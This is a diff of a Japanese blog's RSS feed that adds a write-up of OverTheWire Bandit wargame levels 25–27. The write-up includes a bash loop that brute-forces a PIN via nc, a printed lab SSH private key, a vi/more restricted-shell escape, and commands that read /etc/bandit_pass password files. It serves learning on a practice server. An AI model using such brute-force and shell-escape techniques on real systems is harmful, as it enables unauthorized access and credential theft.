@@ -6,7 +6,202 @@
         <description>Recent content on ただくんぶろぐ</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>ja</language>
-        <lastBuildDate>Thu, 24 Jun 2021 12:30:46 +0900</lastBuildDate><atom:link href="https://tadakun8.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 28 Jun 2021 21:29:30 +0900</lastBuildDate><atom:link href="https://tadakun8.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>【OverTheWire奮闘記】Bandit: Level25〜27</title>
+        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level25-27/</link>
+        <pubDate>Mon, 28 Jun 2021 21:29:30 +0900</pubDate>
+        
+        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level25-27/</guid>
+        <description>&lt;h2 id=&#34;level-25&#34;&gt;Level 25&lt;/h2&gt;
+&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;デーモンがポート30002でlisten状態&lt;/li&gt;
+&lt;li&gt;このポートにbandit24のパスワードと4桁のピンコードを与えるとbandit25のパスワードが手に入る&lt;/li&gt;
+&lt;li&gt;ピンコードはブルートフォースでしか調べることはできない&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;bandit24@bandit:~$ mkdir /tmp/shell
+bandit24@bandit:~$ cd /tmp/shell
+bandit24@bandit:/tmp/shell$ vim make-password-code.sh
+#!/bin/bash
+
+for i in {0000..9999};
+do
+    echo &amp;quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${i}&amp;quot;
+done
+bandit24@bandit:/tmp/shell$ chmod +x make-password-code.sh 
+bandit24@bandit:/tmp/shell$ ./make-password-code.sh &amp;gt; combinations.txt
+bandit24@bandit:/tmp/shell$ nc localhost 30002 &amp;lt; combinations.txt 
+.
+.
+.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+bandit24@bandit:/tmp/shell$ exit
+
+# 以下はローカルで
+$ ssh -l bandit25 -p 2220 bandit.labs.overthewire.org
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit25@bandit.labs.overthewire.org&#39;s password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
+&lt;p&gt;ブルートフォースとは総当たり攻撃のことです。&lt;/p&gt;
+&lt;p&gt;以下のシェルを作って対応しました&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+
+for count in {0000..9999};
+do
+    echo &amp;quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${count}&amp;quot; | timeout -s 9 0.8 nc localhost 30002 &amp;gt;&amp;gt; result.txt
+done
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;・・・ただ、&lt;strong&gt;とても遅い!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;方法は合っていると思いますが、こんなにちんたらしたブルートフォース攻撃は捕まってしまいます笑。&lt;/p&gt;
+&lt;p&gt;なので、先人たちの知恵を拝借しました。こちらのサイトが参考になりました。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://programmercave0.github.io/blog/2019/12/26/Bandit-Level-24-Level-25-OverTheWire&#34;&gt;https://programmercave0.github.io/blog/2019/12/26/Bandit-Level-24-Level-25-OverTheWire&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;ぼくのやり方とほぼ同じでしたが、入力値を&lt;code&gt;echo&lt;/code&gt;ではなくファイルとして読み込んでいる点が異なる部分です。&lt;/p&gt;
+&lt;p&gt;まず、以下のshell(make-password-code.sh)を作り&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+for i in {0000..9999}
+do 
+    echo &amp;quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i&amp;quot;
+done
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;その後、&lt;code&gt;./make-password-code.sh &amp;gt; combinations.txt&lt;/code&gt;で全ての組み合わせのファイルを作成してます。その後に&lt;code&gt;nc localhost 30002&lt;/code&gt;をしてパスワードを取得しています。&lt;/p&gt;
+&lt;p&gt;私は最初、&lt;code&gt;nc&lt;/code&gt;を立ち上げて次の入力を行うにはSIGKILLを行うしか方法がないと思っていました。ただ、ファイルを読み込ませることで、ファイルの内容1行ずつ入力するということができると知りました！この方法だと一瞬でパスワードを取得できます。&lt;/p&gt;
+&lt;h2 id=&#34;level-26&#34;&gt;Level 26&lt;/h2&gt;
+&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;bandit26へログインすることは簡単だが、/bin/bashではない&lt;/li&gt;
+&lt;li&gt;それがどのように機能するのかを調べる&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;bandit25@bandit:~$ cat bandit26.sshkey 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+bandit25@bandit:~$ exit
+
+# 以下はローカルで
+$ touch ~/.ssh/bandit/bandit26.private.pem
+$ vim ~/.ssh/bandit/bandit26.private.pem
+※ cat bandit26.sshkey の結果を貼り付ける
+$ chmod 600 ~/.ssh/bandit/bandit26.private.pem
+(端末のウィンドウサイズを小さくする)
+$ ssh -i ~/.ssh/bandit/bandit26.private.pem -l bandit26 -p 2220 bandit.labs.overthewire.org
+(moreの画面で)
+v
+:set shell=/bin/bash
+:shell
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;ls&lt;/code&gt;すると秘密鍵があるので、ローカルへ登録します&lt;/p&gt;
+&lt;p&gt;その鍵を指定し、bandit26でログインしようとすると&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ ssh -i ~/.ssh/bandit/bandit26.private.pem -l bandit26 -p 2220 bandit.labs.overthewire.org
+.
+.
+.
+  Enjoy your stay!
+
+  _                     _ _ _   ___   __  
+ | |                   | (_) | |__ \ / /  
+ | |__   __ _ _ __   __| |_| |_   ) / /_  
+ | &#39;_ \ / _` | &#39;_ \ / _` | | __| / / &#39;_ \ 
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
+Connection to bandit.labs.overthewire.org closed.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;でConnectionが切れてしまいました。&lt;/p&gt;
+&lt;p&gt;・・・なるほど、ログインシェルが&lt;code&gt;/bin/bash&lt;/code&gt;じゃないのか。&lt;/p&gt;
+&lt;p&gt;ログインシェルの情報は&lt;code&gt;/etc/passwd&lt;/code&gt;に記載があります。ということで、再度bandit25のユーザでログインし、&lt;code&gt;/etc/passwd&lt;/code&gt;を見に行きます。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ cat /usr/bin/showtext 
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;TERMという環境変数は調べてみると、どうやら端末の種類みたいです&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://x68000.q-e-d.net/~68user/unix/pickup?TERM&#34;&gt;http://x68000.q-e-d.net/~68user/unix/pickup?TERM&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;more ~/text.txt&lt;/code&gt;とあるので、bandit26でログインした時には&lt;code&gt;text.txt&lt;/code&gt;の値が表示されるようです。そして&lt;code&gt;exit 0&lt;/code&gt;で正常しているので、ログインは成功しているのですが、処理が終了します。&lt;/p&gt;
+&lt;p&gt;方法としては以下の2つがありましたが、どちらも権限で書き換えられず&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;/etc/passwdを書き換えて、bandit26のログインシェルを/bin/bashにする&lt;/li&gt;
+&lt;li&gt;/usr/bin/showtextのexit0を消してみる&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;詰まってしまったため、回答を見に行きました。今回参考にしたのは以下です。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://burakb.net/writeup/overthewire-bandit-level-25-level-26/&#34;&gt;https://burakb.net/writeup/overthewire-bandit-level-25-level-26/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;・・・なるほど、すごい。なぜ&lt;code&gt;cat&lt;/code&gt;ではなく&lt;code&gt;more&lt;/code&gt;でテキストを表示させているかを考える必要があったみたいです。&lt;code&gt;more&lt;/code&gt;は表示する行数が多くなった場合、ページャーになるというコマンドです。今までは端末を最大にしていたので、そのまま表示されていたのですが、端末のウィンドウサイズをとても小さくし、もう一度sshしてみるとページャーになりました。&lt;/p&gt;
+&lt;p&gt;続いて&lt;code&gt;v&lt;/code&gt;を押すと&lt;code&gt;vi&lt;/code&gt;が起動されます。&lt;code&gt;vi&lt;/code&gt;上で&lt;code&gt;:set shell=/bin/bash&lt;/code&gt;、&lt;code&gt;:shell&lt;/code&gt;と打つとシェルが起動しました！&lt;/p&gt;
+&lt;p&gt;まとめると、&lt;code&gt;more&lt;/code&gt;にはエディター(今回は&lt;code&gt;vi&lt;/code&gt;)を起動することができ、そのエディター経由でシェルを起動する、ということに気づくかどうかがこの問題を解く鍵でした。&lt;/p&gt;
+&lt;h2 id=&#34;level-27&#34;&gt;Level 27&lt;/h2&gt;
+&lt;h3 id=&#34;goal-2&#34;&gt;Goal&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Good job getting a shell! Now hurry and grab the password for bandit27!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;シェル取ったらbandit27のパスワードを取得する&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;resolve-2&#34;&gt;resolve&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+bandit26@bandit:~$ exit
+(viの画面で)
+:q
+
+# 以下はローカルで行う
+$ ssh -l bandit27 -p 2220 bandit.labs.overthewire.org
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit27@bandit.labs.overthewire.org&#39;s password: 3ba3118a22e93127a4ed485be72ef5ea
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-2&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;ls&lt;/code&gt;すると&lt;code&gt;bandit27-do&lt;/code&gt;というスクリプトがあるのでそれを実行しました。スクリプトの使い方は引数なしで実行するとでます。&lt;/p&gt;
+&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;
+&lt;p&gt;ブルートフォースという単語が出てきて、少しセキュリティっぽくなってきました。&lt;/p&gt;
+&lt;p&gt;詰まってしまったときにはずーっと取り組み続けて、なんの成果も得られませんでした状態になりました。調べていくうちに色々わかってくるのですが、手が尽きたら諦めて、一度回答を見るというのも選択肢として入れたいです。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>【OverTheWire奮闘記】Bandit: Level22〜24</title>
         <link>https://tadakun8.github.io/post/over-the-wire/bandit/level22-24/</link>
         <pubDate>Thu, 24 Jun 2021 12:30:46 +0900</pubDate>
@@ -103,6 +298,12 @@ bandit23@bandit:/tmp/shell$ cp cat-password.sh /var/spool/bandit24
 bandit23@bandit:/tmp/shell$ cat password 
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 bandit23@bandit:/tmp/shell$ exit
+
+# 以下はローカルで
+$ 
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit24@bandit.labs.overthewire.org&#39;s password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-2&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
 &lt;h4 id=&#34;まずはcdとcatする&#34;&gt;まずはcdとcatする&lt;/h4&gt;
 &lt;p&gt;&lt;code&gt;cd /etc/cron.d&lt;/code&gt;、&lt;code&gt;cat cronjob_bandit24&lt;/code&gt;すると&lt;/p&gt;
